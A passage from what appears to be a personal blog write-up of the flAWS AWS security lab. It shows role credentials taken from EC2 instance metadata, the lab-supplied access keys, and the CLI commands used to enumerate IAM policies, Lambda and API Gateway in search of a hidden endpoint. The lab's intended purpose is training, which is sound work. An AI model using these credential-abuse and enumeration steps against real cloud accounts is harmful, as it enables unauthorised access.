AWS Metadata API. Therefore, accessing the APIPA address, metadata can be obtained. There is a role under <code class="language-plaintext highlighter-rouge">security-credentials</code> i.e., the role of <code class="language-plaintext highlighter-rouge">flaws</code> has been attached to the EC2 instance.</p><p>Therefore, using the access key ID. secret access key and the session token, the role can effectively be assumed →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>[flaws2]
+aws_access_key_id = ASIA6GG7PSQGUEOUS2GF
+aws_secret_access_key = hrPK9j2qJ8nB3tSBsAwQ7/dauDE6dAOdRAwvaAUS
+aws_session_token = IQoJb3JpZ2luX2VjEJn/....redacted....q+XnpTW+fg==
+</pre></table></code></div></div><p>Using this to get the contents of the level6 S3 bucket as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre> awsn s3 <span class="nb">ls </span>s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ <span class="nt">--profile</span> flaws2
+</pre></table></code></div></div><p>This gives the name of the directory where the next level is located.</p><hr /><h2 id="level-6"><span class="mr-2">Level 6</span><a href="#level-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote class="prompt-info"><p>For this final challenge, you’re getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account. Access key ID: <code class="language-plaintext highlighter-rouge">AKIAJFQ6E7BY57Q3OBGA</code> Secret: <code class="language-plaintext highlighter-rouge">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</code></p></blockquote><p>Adding these credentials to the <code class="language-plaintext highlighter-rouge">credentials</code> file grants us the user <code class="language-plaintext highlighter-rouge">Level6</code>.</p><p>The SecurityAudit group can get a high level overview of the resources in an AWS account, but it’s also useful for looking at IAM policies. To find information about the user, use →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>awsn iam get-user <span class="nt">--profile</span> level6flaws
+</pre></table></code></div></div><p>This returns →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+    </span><span class="nl">"User"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"Path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"UserName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Level6"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"UserId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AIDAIRMDOSCWGLCDWOG6A"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"Arn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::975426262029:user/Level6"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"CreateDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2017-02-26T23:11:16+00:00"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>Overview of the account can be retrieved using this role by using <code class="language-plaintext highlighter-rouge">iam get-account-summary</code> and all policies can be retrieved by using <code class="language-plaintext highlighter-rouge">list-policies</code>, however, that lists a complete bunch of policies (including AWS managed ones). Therefore, to retrieve the policies attached to the current user, use <code class="language-plaintext highlighter-rouge">iam list-user-attached-policies --user-name Level6</code> and this gives the result →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+    </span><span class="nl">"AttachedPolicies"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"PolicyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"list_apigateways"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"PolicyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::975426262029:policy/list_apigateways"</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"PolicyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"MySecurityAudit"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"PolicyArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::975426262029:policy/MySecurityAudit"</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>The MySecurityAudit policy is the one that allows us to do everything we are able to do. The other policy could be interesting. To get information about a policy use →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>awsn iam get-policy <span class="nt">--policy-arn</span> arn:aws:iam::975426262029:policy/list_apigateways <span class="nt">--profile</span> level6flaws
+</pre></table></code></div></div><p>This gives the information on the policy as →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+    </span><span class="nl">"Policy"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"PolicyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"list_apigateways"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"PolicyId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ANPAIRLWTQMGKCSPGTAIO"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"Arn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::975426262029:policy/list_apigateways"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"Path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"DefaultVersionId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"v4"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"AttachmentCount"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"PermissionsBoundaryUsageCount"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"IsAttachable"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"Description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"List apigateways"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"CreateDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2017-02-20T01:45:17+00:00"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"UpdateDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2017-02-20T01:48:17+00:00"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"Tags"</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>With the version ID known, information about that version can be retrieved using →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>awsn iam get-policy-version <span class="nt">--version-id</span> v4 <span class="nt">--policy-arn</span> arn:aws:iam::975426262029:policy/list_apigateways <span class="nt">--profile</span> level6flaws
+</pre></table></code></div></div><p>This gives the result →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+    </span><span class="nl">"PolicyVersion"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"Document"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+                </span><span class="p">{</span><span class="w">
+                    </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+                        </span><span class="s2">"apigateway:GET"</span><span class="w">
+                    </span><span class="p">],</span><span class="w">
+                    </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
+                    </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:apigateway:us-west-2::/restapis/*"</span><span class="w">
+                </span><span class="p">}</span><span class="w">
+            </span><span class="p">]</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="nl">"VersionId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"v4"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"IsDefaultVersion"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"CreateDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2017-02-20T01:48:17+00:00"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>This says that the policy allows the Level6 user to call <code class="language-plaintext highlighter-rouge">apigateway:GET</code> on the API Gateway for <code class="language-plaintext highlighter-rouge">restapis/*</code>. However, the user cannot perform a GET on the list of APIs themselves, just a specific one which has a policy attached to allow it.</p><p>Therefore, listing the capabilities using the policy <code class="language-plaintext highlighter-rouge">MySecurityAudit</code>, there are a number of services that the user can retrieve information for. Trying a few, lands us at Lambda, where functions can be listed as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>awsn lambda list-functions <span class="nt">--profile</span> level6flaws <span class="nt">--region</span> us-west-2
+</pre></table></code></div></div><p>This gives the result →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+    </span><span class="nl">"Functions"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"FunctionName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Level6"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"FunctionArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:lambda:us-west-2:975426262029:function:Level6"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Runtime"</span><span class="p">:</span><span class="w"> </span><span class="s2">"python2.7"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:iam::975426262029:role/service-role/Level6"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Handler"</span><span class="p">:</span><span class="w"> </span><span class="s2">"lambda_function.lambda_handler"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"CodeSize"</span><span class="p">:</span><span class="w"> </span><span class="mi">282</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"A starter AWS Lambda function."</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Timeout"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"MemorySize"</span><span class="p">:</span><span class="w"> </span><span class="mi">128</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"LastModified"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2017-02-27T00:24:36.054+0000"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"CodeSha256"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw="</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"$LATEST"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"TracingConfig"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="nl">"Mode"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PassThrough"</span><span class="w">
+            </span><span class="p">},</span><span class="w">
+            </span><span class="nl">"RevisionId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"98033dfd-defa-41a8-b820-1f20add9c77b"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"PackageType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Zip"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Architectures"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+                </span><span class="s2">"x86_64"</span><span class="w">
+            </span><span class="p">],</span><span class="w">
+            </span><span class="nl">"EphemeralStorage"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="nl">"Size"</span><span class="p">:</span><span class="w"> </span><span class="mi">512</span><span class="w">
+            </span><span class="p">}</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>Of the actions allowed in the <code class="language-plaintext highlighter-rouge">MySecurityAudit</code> policy, the user can also get the policy attached to the function. Therefore using the following to print the JSON policy →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>awsn lambda get-policy <span class="nt">--function-name</span> Level6 <span class="nt">--profile</span> level6flaws <span class="nt">--region</span> us-west-2 | python3 <span class="nt">-c</span> <span class="s1">'import json; input(); x = input(); print(json.loads(x.split(": ")[1][:-1]))'</span> | python3 <span class="nt">-m</span> json.tool
+</pre></table></code></div></div><p>This gives the policy as →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+    </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"Id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"default"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"Sid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"904610a93f593b76ad66ed6ed82c0a8b"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Allow"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="nl">"Service"</span><span class="p">:</span><span class="w"> </span><span class="s2">"apigateway.amazonaws.com"</span><span class="w">
+            </span><span class="p">},</span><span class="w">
+            </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"lambda:InvokeFunction"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Resource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:lambda:us-west-2:975426262029:function:Level6"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"Condition"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="nl">"ArnLike"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+                    </span><span class="nl">"AWS:SourceArn"</span><span class="p">:</span><span class="w"> </span><span class="s2">"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6"</span><span class="w">
+                </span><span class="p">}</span><span class="w">
+            </span><span class="p">}</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>This shows that the API Gateway is allowed to Invoke the Lambda function if the ARN matches <code class="language-plaintext highlighter-rouge">arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6</code>. This means that the Rest API name to invoke it must be <code class="language-plaintext highlighter-rouge">s33ppypa75</code>. Using API Gateway to get information for this API as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>awsn apigateway get-rest-api <span class="nt">--rest-api-id</span> s33ppypa75 <span class="nt">--profile</span> level6flaws <span class="nt">--region</span> us-west-2
+</pre></table></code></div></div><p>This gives the results as →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+    </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"s33ppypa75"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Level6"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"createdDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2017-02-26T18:21:35-06:00"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"apiKeySource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"HEADER"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"endpointConfiguration"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"types"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+            </span><span class="s2">"EDGE"</span><span class="w">
+        </span><span class="p">]</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="nl">"tags"</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
+    </span><span class="nl">"disableExecuteApiEndpoint"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>This shows that the Execute API Endpoint has not been disabled i.e., it can be reached via a URL to call the API. The default endpoint for Execute API for an API is as follows →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>https://{restapi_id}.execute-api.{region}.amazonaws.com/{stage_name}/
+</pre></table></code></div></div><p>Therefore, a stage name is needed, which can be retrieved from <code class="language-plaintext highlighter-rouge">get-stages</code> subcommand that gives the following result →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+    </span><span class="nl">"item"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"deploymentId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"8gppiv"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"stageName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Prod"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"cacheClusterEnabled"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"cacheClusterStatus"</span><span class="p">:</span><span class="w"> </span><span class="s2">"NOT_AVAILABLE"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"methodSettings"</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span><span class="w">
+            </span><span class="nl">"tracingEnabled"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"createdDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2017-02-26T18:26:08-06:00"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"lastUpdatedDate"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2017-02-26T18:26:08-06:00"</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>Next, the resources need to be identified within the stage that can be called. This is done by using the <code class="language-plaintext highlighter-rouge">get-resources</code> subcommand which gives the following result →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+    </span><span class="nl">"items"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"6m5gni"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"parentId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"y8nk5v2z1h"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"pathPart"</span><span class="p">:</span><span class="w"> </span><span class="s2">"level6"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/level6"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"resourceMethods"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+                </span><span class="nl">"GET"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
+            </span><span class="p">}</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"y8nk5v2z1h"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"path"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></table></code></div></div><p>Therefore, the URL is as follows →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
+</pre></table></code></div></div><p>If the last <code class="language-plaintext highlighter-rouge">level6</code> is not included, it is the root resource that is called, otherwise it is the user resource when specified. A curl request on this URL gives the following →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/
+</pre></table></code></div></div><p>That’s the end of the Challenge.</p><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/blog/categories/lab-practice-notes/'>Lab Practice Notes</a>, <a href='/blog/categories/aws-labs/'>AWS Labs</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/blog/tags/aws/" class="post-tag no-text-decoration" >aws</a> <a href="/blog/tags/lab/" class="post-tag no-text-decoration" >lab</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=flAWS%201%20-%20Tanishq%20Rupaal&url=https%3A%2F%2Ftanishq.page%2Fblog%2F%2Fblog%2Fposts%2Fflaws-1%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=flAWS%201%20-%20Tanishq%20Rupaal&u=https%3A%2F%2Ftanishq.page%2Fblog%2F%2Fblog%2Fposts%2Fflaws-1%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ftanishq.page%2Fblog%2F%2Fblog%2Fposts%2Fflaws-1%2F&text=flAWS%201%20-%20Tanishq%20Rupaal" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ftanishq.page%2Fblog%2F%2Fblog%2Fposts%2Fflaws-1%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" 